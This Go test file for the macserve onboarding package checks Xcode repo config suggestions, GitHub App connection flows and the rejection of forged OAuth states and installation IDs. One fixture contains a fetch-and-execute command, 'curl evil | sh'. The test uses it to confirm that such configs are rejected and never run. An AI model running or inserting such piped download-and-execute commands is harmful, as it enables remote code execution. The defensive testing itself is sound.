package onboarding

import (
	"bytes"
	"context"
	"errors"
	"html"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/jerryfane/macserve/internal/model"
)

func TestSuggestRepoConfigsFromTreeOnly(t *testing.T) {
	entries := []TreeEntry{
		{Path: "App.xcodeproj", Type: "tree"},
		{Path: "App.xcodeproj/xcshareddata/xcschemes/App.xcscheme", Type: "blob"},
		{Path: "App.xcodeproj/xcshareddata/xcschemes/AppTests.xcscheme", Type: "blob"},
		{Path: "App.xcworkspace", Type: "tree"},
		{Path: "Pods/Pods.xcodeproj", Type: "tree"},
		{Path: "Pods/Pods.xcodeproj/xcshareddata/xcschemes/Pods.xcscheme", Type: "blob"},
		{Path: "App.xcodeproj/project.xcworkspace", Type: "tree"},
		{Path: "Tool/Tool.xcodeproj", Type: "tree"},
		{Path: "Tool/Tool.xcodeproj/xcuserdata/me.xcuserdatad/xcschemes/Private.xcscheme", Type: "blob"},
		{Path: "Scripts/build.sh", Type: "blob"},
	}
	got := SuggestRepoConfigs(entries)
	want := []model.RepoConfig{
		{Version: 1, WorkDir: ".", Workspace: "App.xcworkspace", Scheme: "App"},
		{Version: 1, WorkDir: ".", Workspace: "App.xcworkspace", Scheme: "AppTests"},
		{Version: 1, WorkDir: ".", Project: "App.xcodeproj", Scheme: "App"},
		{Version: 1, WorkDir: ".", Project: "App.xcodeproj", Scheme: "AppTests"},
		{Version: 1, WorkDir: "Pods", Project: "Pods.xcodeproj", Scheme: "Pods"},
	}
	if len(got) != len(want) {
		t.Fatalf("got %+v", got)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("%d: got %+v want %+v", i, got[i], want[i])
		}
	}
	var out bytes.Buffer
	if err := WriteRepoConfigSuggestion(&out, got[0], "main"); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out.String(), `"workspace": "App.xcworkspace"`) || !strings.Contains(out.String(), "git push origin HEAD:'main'") {
		t.Fatal(out.String())
	}
}

func TestDetectRepoConfigNeverRunsRepositoryCode(t *testing.T) {
	f := newFakeGitHub(t)
	api := newTestAPI(t, f)
	repo := f.repos[0]
	f.repoConfig = []byte(`{"version":1,"work_dir":".","project":"App.xcodeproj","scheme":"App"}`)
	status, err := api.DetectRepoConfig(context.Background(), fakeToken, repo)
	if err != nil || !status.Found || status.Invalid != nil || status.Config.Project != "App.xcodeproj" || status.Commit != fakeCommit {
		t.Fatalf("%+v %v", status, err)
	}
	f.repoConfig = []byte(`{"version":1,"work_dir":".","project":"App.xcodeproj","scheme":"App","run":"curl evil | sh"}`)
	if status, err := api.DetectRepoConfig(context.Background(), fakeToken, repo); err != nil || !status.Found || status.Invalid == nil {
		t.Fatalf("%+v %v", status, err)
	}
	f.repoConfig = nil
	f.tree = []TreeEntry{{Path: "App.xcodeproj", Type: "tree"}, {Path: "App.xcodeproj/xcshareddata/xcschemes/App.xcscheme", Type: "blob"}}
	status, err = api.DetectRepoConfig(context.Background(), fakeToken, repo)
	if err != nil || status.Found || len(status.Suggestions) != 1 {
		t.Fatalf("%+v %v", status, err)
	}
	for _, call := range f.calls {
		if !strings.HasPrefix(call, "GET ") {
			t.Errorf("detection made a write call: %s", call)
		}
	}
}

// browser plays the user's browser against the loopback flow.
type browser struct {
	t    *testing.T
	base string
}

func (b browser) get(path string) (int, string) {
	resp, err := http.Get(b.base + path)
	if err != nil {
		b.t.Error(err)
		return 0, ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(body)
}

// syncBuffer is a goroutine-safe terminal transcript.
type syncBuffer struct {
	mu sync.Mutex
	b  bytes.Buffer
}

func (s *syncBuffer) Write(p []byte) (int, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.b.Write(p)
}

func (s *syncBuffer) String() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.b.String()
}

func (s *syncBuffer) waitFor(t *testing.T, text string) {
	t.Helper()
	deadline := time.Now().Add(10 * time.Second)
	for !strings.Contains(s.String(), text) {
		if time.Now().After(deadline) {
			t.Fatalf("terminal never showed %q:\n%s", text, s.String())
		}
		time.Sleep(5 * time.Millisecond)
	}
}

func startConnect(t *testing.T, f *fakeGitHub, install func(Confirmed) error) (browser, *io.PipeWriter, *syncBuffer, chan error, *Confirmed) {
	t.Helper()
	listener, err := Listen()
	if err != nil {
		t.Fatal(err)
	}
	in, typed := io.Pipe()
	out := &syncBuffer{}
	done := make(chan error, 1)
	result := &Confirmed{}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	t.Cleanup(cancel)
	t.Cleanup(func() { typed.Close() })
	go func() {
		c, _, err := Connect(ctx, ConnectOptions{
			Account: Account{Login: "jdoe"}, AppName: "macserve-test", Repository: "jdoe/myapp", RepositoryID: 4242, Author: "jdoe",
			Listener: listener, In: in, Out: out, HTTP: f.options(), Install: install,
		})
		*result = c
		done <- err
	}()
	return browser{t: t, base: "http://" + listener.Addr().(*net.TCPAddr).String()}, typed, out, done, result
}

func formState(t *testing.T, b browser) string {
	t.Helper()
	_, body := b.get("/")
	m := actionPattern.FindStringSubmatch(body)
	if m == nil {
		t.Fatalf("start page %s", body)
	}
	u, err := url.Parse(html.UnescapeString(m[1]))
	if err != nil {
		t.Fatal(err)
	}
	return u.Query().Get("state")
}

func TestConnectEndToEndWithForgedInstallationFirst(t *testing.T) {
	f := newFakeGitHub(t)
	f.repoConfig = []byte(`{"version":1,"work_dir":".","project":"App.xcodeproj","scheme":"App"}`)
	var installed []Confirmed
	b, typed, out, done, result := startConnect(t, f, func(c Confirmed) error { installed = append(installed, c); return nil })
	out.waitFor(t, "Open this address")
	state := formState(t, b)
	if status, _ := b.get("/created?code=goodcode&state=" + strings.Repeat("0", 64)); status != http.StatusBadRequest {
		t.Fatalf("forged state status %d", status)
	}
	if status, _ := b.get("/created?code=goodcode&state=" + state); status != http.StatusOK {
		t.Fatal(status)
	}
	out.waitFor(t, "/apps/macserve-studio/installations/new")
	// A forged installation_id (another account's installation of some
	// other App) is refused; nothing is installed.
	f.mu.Lock()
	f.installations[999] = fakeInstallation{AppID: 12, Account: Owner{Login: "mallory", ID: 666, Type: "User"}, Selection: "selected", Permissions: RequiredPermissions()}
	f.mu.Unlock()
	b.get("/installed?installation_id=999&setup_action=install")
	out.waitFor(t, "Installation not accepted")
	if len(installed) != 0 {
		t.Fatal("installed before confirmation")
	}
	// The real one, pasted from another device.
	if _, err := io.WriteString(typed, "http://"+strings.TrimPrefix(b.base, "http://")+"/installed?installation_id=555&setup_action=install\n"); err != nil {
		t.Fatal(err)
	}
	if err := <-done; err != nil {
		t.Fatalf("%v\n%s", err, out.String())
	}
	if len(installed) != 1 || installed[0].Installation.ID != 555 || installed[0].App.ID != 77 || installed[0].Author.ID != 1001 || installed[0].Repository.DefaultBranch != "main" {
		t.Fatalf("%+v", installed)
	}
	if result.Installation.ID != 555 {
		t.Fatal(result)
	}
	if !strings.Contains(out.String(), "valid .macserve.json") {
		t.Fatal(out.String())
	}
	if strings.Contains(out.String(), "PRIVATE KEY") || strings.Contains(out.String(), fakeToken) {
		t.Fatal("terminal shows a secret")
	}
}

func TestConnectPastedCreationRedirectAndSuggestion(t *testing.T) {
	f := newFakeGitHub(t)
	f.tree = []TreeEntry{{Path: "App.xcodeproj", Type: "tree"}, {Path: "App.xcodeproj/xcshareddata/xcschemes/App.xcscheme", Type: "blob"}}
	b, typed, out, done, _ := startConnect(t, f, func(Confirmed) error { return nil })
	out.waitFor(t, "Open this address")
	state := formState(t, b)
	for _, line := range []string{
		"not a url",
		b.base + "/created?code=goodcode&state=" + strings.Repeat("f", 64),
		b.base + "/created?code=goodcode&state=" + state,
	} {
		if _, err := io.WriteString(typed, line+"\n"); err != nil {
			t.Fatal(err)
		}
	}
	out.waitFor(t, "installations/new")
	if n := strings.Count(out.String(), "Not accepted"); n != 2 {
		t.Fatalf("%d refusals:\n%s", n, out.String())
	}
	b.get("/installed?installation_id=555&setup_action=install")
	out.waitFor(t, "cat > .macserve.json")
	if _, err := io.WriteString(typed, "skip\n"); err != nil {
		t.Fatal(err)
	}
	if err := <-done; err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out.String(), `"project": "App.xcodeproj"`) {
		t.Fatal(out.String())
	}
}

func TestConnectRefusedAppKeepsNoKey(t *testing.T) {
	f := newFakeGitHub(t)
	f.permissions["administration"] = "write"
	called := false
	b, _, out, done, _ := startConnect(t, f, func(Confirmed) error { called = true; return nil })
	out.waitFor(t, "Open this address")
	b.get("/created?code=goodcode&state=" + formState(t, b))
	err := <-done
	var refused *RefusedAppError
	if !errors.As(err, &refused) || called {
		t.Fatalf("err %v installed %v", err, called)
	}
}

func TestConnectInstallFailureIsReported(t *testing.T) {
	f := newFakeGitHub(t)
	b, _, out, done, _ := startConnect(t, f, func(Confirmed) error { return ErrKeyExists })
	out.waitFor(t, "Open this address")
	b.get("/created?code=goodcode&state=" + formState(t, b))
	out.waitFor(t, "installations/new")
	b.get("/installed?installation_id=555")
	if err := <-done; !errors.Is(err, ErrKeyExists) {
		t.Fatal(err)
	}
}
